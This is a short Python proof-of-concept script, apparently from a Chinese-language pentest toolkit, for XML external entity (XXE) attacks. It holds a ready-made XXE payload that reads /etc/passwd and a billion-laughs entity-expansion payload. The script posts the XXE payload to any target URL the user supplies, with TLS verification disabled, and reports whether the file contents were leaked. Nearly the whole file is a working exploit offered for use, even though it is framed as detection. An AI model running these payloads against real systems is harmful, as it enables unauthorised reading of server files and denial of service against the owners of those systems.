#!/usr/bin/env python3
"""
XXE 漏洞 POC 库
检测: XML 解析器 XXE、PDF/Word XXE、SOAP XXE
"""
import argparse, sys
sys.path.insert(0, '..')

XXE_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>"""

BILLION_LAUGHS = """<?xml version="1.0"?>
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]>
<lolz>&lol3;</lolz>"""

def main():
    parser = argparse.ArgumentParser(description="XXE 漏洞检测")
    parser.add_argument("-t", "--target", required=True, help="XML 端点 URL")
    parser.add_argument("-p", "--param", default="xml", help="参数名")
    args = parser.parse_args()

    import urllib.request, ssl
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    headers = {"Content-Type": "application/xml"}
    req = urllib.request.Request(args.target, data=XXE_PAYLOAD.encode(), headers=headers, method="POST")
    try:
        resp = urllib.request.urlopen(req, timeout=15, context=ctx)
        body = resp.read().decode('utf-8', errors='ignore')
        if "root:" in body:
            print("[+] XXE 漏洞确认! 可读取本地文件")
        else:
            print(f"[*] 响应长度: {len(body)}")
    except urllib.request.HTTPError as e:
        print(f"[-] HTTP {e.code}: {e.read().decode(errors='ignore')[:200]}")
    except Exception as ex:
        print(f"[-] {ex}")

if __name__ == "__main__":
    main()
